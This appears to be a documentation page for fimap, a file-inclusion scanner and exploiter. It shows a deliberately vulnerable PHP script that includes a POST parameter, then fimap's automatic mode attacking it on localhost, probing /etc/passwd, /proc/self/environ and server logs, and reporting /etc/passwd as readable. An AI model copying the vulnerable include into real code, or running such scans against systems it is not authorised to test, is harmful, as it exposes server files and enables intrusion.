# Introduction #
AutoAwesome Mode? Sounds Awesome! Actually it is! Here is an example:


# Exploitable PHP Code #
```
<?php

        if (isset($_POST["go"])){
                include($_POST["action"]); // <-- Only when the POST value 'go' is defined.
        }else{
                echo "<html>";
                echo "<body>";
                echo "<form action='test.php' method='POST'>";
                echo "<input type='hidden' name='go'>";
                echo "<input type='hidden' name='action' value='index.html'>";
                echo "<input type='submit' name='submit' value='Go'>";
                echo "</form>";
                echo "</html>";
        }
?>
```


# Exploiting it using AutoAwesome Mode #
```
imax@Develb0x:/st0rage/dev/fimap/src$ ./fimap.py -4  -u "http://localhost/~imax/fail/test.php" -C
fimap v.09_svn (For the Swarm)
:: Automatic LFI/RFI scanner and exploiter
:: by Iman Karim (fimap.dev@gmail.com)

AutoAwesome mode engaging URL 'http://localhost/~imax/fail/test.php'...
Requesting 'http://localhost/~imax/fail/test.php'...
Analyzing form 'Unnamed Form #1' for file inclusion bugs.
[05:38:30] [OUT] Inspecting URL 'http://localhost/~imax/fail/test.php'...
[05:38:30] [INFO] Fiddling around with URL...
[05:38:30] [OUT] [PHP] Possible file inclusion found! -> 'http://localhost/~imax/fail/test.php' with POST-Parameter 'action'.
[05:38:30] [OUT] [PHP] Identifying Vulnerability 'http://localhost/~imax/fail/test.php' with POST-Parameter 'action'...
[05:38:30] [INFO] Scriptpath received: '/home/imax/public_html/fail'
[05:38:30] [INFO] Operating System is 'Unix-Like'.
[05:38:30] [INFO] Testing file '/etc/passwd'...
[05:38:30] [INFO] Testing file '/proc/self/environ'...
[05:38:30] [INFO] Testing file 'php://input'...
[05:38:31] [INFO] Testing file '/var/log/apache2/access.log'...
[05:38:31] [INFO] Testing file '/var/log/apache/access.log'...
[05:38:31] [INFO] Testing file '/var/log/httpd/access.log'...
[05:38:31] [INFO] Testing file '/var/log/apache2/access_log'...
[05:38:31] [INFO] Testing file '/var/log/apache/access_log'...
[05:38:31] [INFO] Testing file '/var/log/httpd/access_log'...
[05:38:32] [INFO] Testing file 'http://www.phpbb.de/index.php'...
###########################################################
#[1] Possible PHP-File Inclusion                          #
###########################################################
#::REQUEST                                                #
#  [URL]        http://localhost/~imax/fail/test.php      #
#  [POST]       go=&action=index.html&submit=Go           #
#  [HEAD SENT]                                            #
#::VULN INFO                                              #
#  [POSTPARM]   action                                    #
#  [PATH]       /home/imax/public_html/fail               #
#  [OS]         Unix                                      #
#  [TYPE]       Absolute Clean                            #
#  [TRUNCATION] No Need. It's clean.                      #
#  [READABLE FILES]                                       #
#                   [0] /etc/passwd                       #
###########################################################
Starting harvester engine to get links (Depth: 0)...
No links found.
AutoAwesome is done.
```

# So what exactly happend? #
  1. fimap requests the URL "http://localhost/~imax/fail/test.php" and searches any 'Set-Cookie' stuff and forms.
  1. The Cookies and\or forms will be scanned automaticly for file inclusion bugs.
  1. Now fimap will start the harvest engine to collect all URLs on the page.
  1. Finally the links will also be scanned for file inclusion bugs.

# What's so good about it? #
  * You don't have to provide all the parameters to fimap.
  * fimap will grab automaticly all forms, cookies and links for testing.

# What's not so good? #
Well - fimap can only find cookies, links and forms which are somewhere in the URL\HTML page you have defined with -u. Makes sense or not? :)